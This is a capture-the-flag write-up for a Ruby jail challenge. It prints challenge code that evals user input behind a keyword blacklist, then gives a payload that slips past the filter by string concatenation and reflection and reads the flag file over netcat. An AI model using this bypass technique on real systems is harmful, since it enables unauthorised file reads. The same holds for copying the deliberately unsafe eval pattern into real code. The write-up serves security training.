# Eevee Jail - 5

Now, this time we are given a Ruby jail, we're getting all sorts of language jails aren't we here...

{% tabs %}
{% tab title="jail-5.rb" %}
```ruby
#!/usr/bin/env ruby

ALLOWED_COMMANDS = ["ls"]

def sanitize_input(input)
  forbidden_words = %w[flag eval system read exec irb puts dir]
  
  forbidden_pattern = /\b(?:#{forbidden_words.join('|')})\b/

  if input.match(/[&|<>$`]/) || input.match(forbidden_pattern)
    return false
  end
  true
end

def execute_command(cmd)
  if ALLOWED_COMMANDS.include?(cmd.split.first)
    system(cmd)
  else
    puts "Command not allowed!"
  end
end

puts "========================\n"
puts "=    Eevee's Jail 5    =\n"
puts "========================\n"

while true
  print "[+] > "
  input = gets.chomp

  unless sanitize_input(input)
    puts "Invalid characters detected!"
    next
  end

  if input.start_with?("ruby:")
    begin
      eval(input[5..])
    rescue Exception => e
      puts "Error: #{e.message}"
    end
    next
  end

  execute_command(input)
end
```
{% endtab %}
{% endtabs %}

We can see that it checks for:

```
flag, eval, system, read, exec, irb, puts, dir
```

And some special characters:

```
&|<>$`
```

and later of that it checks for the prefix, making sure our input starts with "`ruby:` ", after that it gets passed to `eval()`

So, my plan was to use the `File` class and concatenate the blacklisted words effectively bypassing them and reading the flag

```ruby
ruby:p Object.const_get("File").send(:open, "fl" + "ag.txt").send("re" + "ad")
```

```
❯ nc 157.180.92.15 52609
             
========================
=    Eevee's Jail 5    =
========================
[+] > ruby:p Object.const_get("File").send(:open, "fl" + "ag.txt").send("re" + "ad")
ruby:p Object.const_get("File").send(:open, "fl" + "ag.txt").send("re" + "ad")
"bbctf{different language, same approach xx}\n"
```

Flag: `bbctf{different language, same approach xx}`
